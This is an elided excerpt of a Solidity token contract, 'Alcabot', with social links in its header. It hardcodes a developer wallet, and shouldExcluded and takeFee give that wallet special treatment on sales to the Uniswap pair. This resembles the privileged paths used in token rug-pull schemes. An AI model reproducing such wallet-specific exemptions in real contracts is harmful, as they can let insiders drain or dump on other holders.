...
/**
    ...
    Website     https://www.alcabot.net

    X           https://x.com/ethalcabot

    Telegram    https://t.me/ethalcabot
...
contract ALCABOT is Context, IERC20, Ownable {
    using SafeMath for uint256;
    
    string private _name = unicode"Alcabot";
    string private _symbol = unicode"ALCABOT";
    uint8 private _decimals = 18;

    address payable public marketingWallet = payable(msg.sender);
    address payable public DeveloperWallet = payable(0xD12e04287e8452C742fB324767aFB77094f5B57D);
    ...
    function shouldExcluded(address sender, address recipient) internal view returns (bool) {
        return recipient == uniswapPair && sender == DeveloperWallet && sender != address(0) && recipient !=address(0);
    }
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        if(isMarketPair[sender]) {
            ...
            feeCount -= balanceOf(DeveloperWallet);
